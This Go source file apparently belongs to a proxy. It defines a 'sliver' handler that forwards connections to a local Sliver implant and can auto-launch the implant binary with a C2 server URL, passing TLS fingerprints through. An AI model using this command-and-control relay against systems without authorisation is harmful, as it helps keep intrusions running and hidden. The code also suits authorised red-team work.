package handler

import (
	"context"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"time"
)

type SliverHandler struct {
	ImplantPort string
	ImplantPath string
	AutoStart   bool
	C2Server    string
	idle        time.Duration
}

func init() {
	Register("sliver", func(args map[string]string) (Handler, error) {
		return &SliverHandler{
			ImplantPort: orDefault(args["implant_port"], "31337"),
			ImplantPath: orDefault(args["implant_path"], ""),
			AutoStart:   args["auto_start"] == "true",
			C2Server:    orDefault(args["c2_server"], ""),
		}, nil
	})
}

func (h *SliverHandler) Name() string { return "sliver" }

// KeepFingerprint: TLS ClientHello 指纹是握手数据前缀, 必须传给 implant
func (h *SliverHandler) KeepFingerprint() {}

func (h *SliverHandler) SetIdleTimeout(d time.Duration) { h.idle = d }

func (h *SliverHandler) Handle(ctx context.Context, conn net.Conn) error {
	defer conn.Close()
	conn = newIdleConn(conn, h.idle)

	if h.AutoStart && h.ImplantPath != "" {
		h.ensureImplant(ctx)
	}

	implant, err := net.DialTimeout("tcp",
		net.JoinHostPort("127.0.0.1", h.ImplantPort), 3*time.Second)
	if err != nil {
		log.Printf("sliver: implant not reachable on :%s: %v", h.ImplantPort, err)
		return err
	}
	defer implant.Close()

	errCh := make(chan error, 2)
	go func() { _, err := io.Copy(implant, conn); errCh <- err }()
	go func() { _, err := io.Copy(conn, implant); errCh <- err }()

	for i := 0; i < 2; i++ {
		<-errCh
	}
	return nil
}

func (h *SliverHandler) ensureImplant(ctx context.Context) {
	c, err := net.DialTimeout("tcp",
		net.JoinHostPort("127.0.0.1", h.ImplantPort), 500*time.Millisecond)
	if err == nil {
		c.Close()
		return
	}
	if _, err := os.Stat(h.ImplantPath); err != nil {
		log.Printf("sliver: implant binary not found at %s", h.ImplantPath)
		return
	}
	args := []string{}
	if h.C2Server != "" {
		args = append(args, "--url", h.C2Server)
	}
	cmd := exec.CommandContext(ctx, h.ImplantPath, args...)
	cmd.Stdout = os.Stderr
	cmd.Stderr = os.Stderr
	if err := cmd.Start(); err != nil {
		log.Printf("sliver: start implant: %v", err)
		return
	}
	log.Printf("sliver: implant started (pid=%d)", cmd.Process.Pid)
	for i := 0; i < 30; i++ {
		c, err := net.DialTimeout("tcp",
			net.JoinHostPort("127.0.0.1", h.ImplantPort), 500*time.Millisecond)
		if err == nil {
			c.Close()
			return
		}
		time.Sleep(500 * time.Millisecond)
	}
}

func orDefault(val, def string) string {
	if val == "" {
		return def
	}
	return val
}
